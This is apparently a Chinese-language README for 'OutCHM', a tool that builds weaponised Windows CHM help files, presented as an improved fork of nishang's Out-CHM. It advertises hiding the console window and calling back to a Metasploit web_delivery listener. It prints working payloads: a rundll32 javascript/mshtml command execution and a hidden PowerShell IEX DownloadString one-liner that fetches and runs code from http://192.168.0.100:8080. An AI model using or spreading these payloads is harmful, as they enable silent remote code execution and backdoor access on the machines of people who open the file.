# OutCHM
OutCHM就是可以生成一个CHM啦。

---

nishang/client/Out-CHM.ps1 的优化版，隐藏了原版的黑窗闪过，修复多次运行的bug，支持反弹 msf> web_delivery的反弹后门与静默自定义命令。

用法：
    
    OutCHM.py -p 'command' -o outfile.chm
    OutCHM.py -s 'http://192.168.0.100:8080' -o outfile.chm

核心命令类似下面的：
    
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami > c:\\nishang\\1.txt",0,true);
    
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100:8080/&#39;));",0,true);

    
似乎也没啥说的了，反正我觉得已经很好用啦。
